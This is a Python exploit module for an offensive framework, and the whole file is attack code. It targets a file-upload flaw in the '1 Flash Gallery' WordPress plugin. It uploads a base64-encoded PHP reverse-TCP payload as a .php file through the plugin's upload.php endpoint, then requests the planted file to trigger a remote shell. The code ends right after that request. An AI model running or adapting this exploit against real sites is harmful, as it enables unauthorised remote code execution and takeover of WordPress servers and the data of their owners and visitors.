from deathnote_module import *
from lib.http.http_client import Http_client

class Module(Exploit, Http_client):

    __info__ = {
        "name": "Wordpress plugin - 1 Flash Gallery",
        "description": "1 Flash Gallery Wordpress Plugin File Upload Exploit",
        "cve": "",
        "payload": {
            "default": "payloads/singles/php/reverse_tcp",
            "arch": "php",
            "platform": "php",
            "category": "singles",
            "encoder": "encoders/php/base64"
            }
    }	

    def run(self):
        
        boundary = self.random_text(6)
        filename = self.random_text(8)
        data = f'--{boundary}\r\nContent-Disposition: form-data; name="Filedata"; filename="{filename}.php"\r\nContent-Type: application/x-httpd-php\r\n\r\n'
        data += self.payload        
        data += f"\r\n--{boundary}"
        headers = {
                    'Content-Type': f'multipart/form-data; boundary={boundary}',
                    'Content-Length': len(data)
                }

        r = self.http_request(
                        method="POST",
                        path="/wp-content/plugins/1-flash-gallery/upload.php?action=uploadify&fileext=php",
                        data=data,
                        headers=headers,
                        )

        if r:
            print_success("Successfully uploaded shell...")
            shell_path = r.text.split("_")[0]
            print_status(f"Trying to access shell at {shell_path}")
            r = self.http_request(
                            method="GET",
                            path=shell_path
            )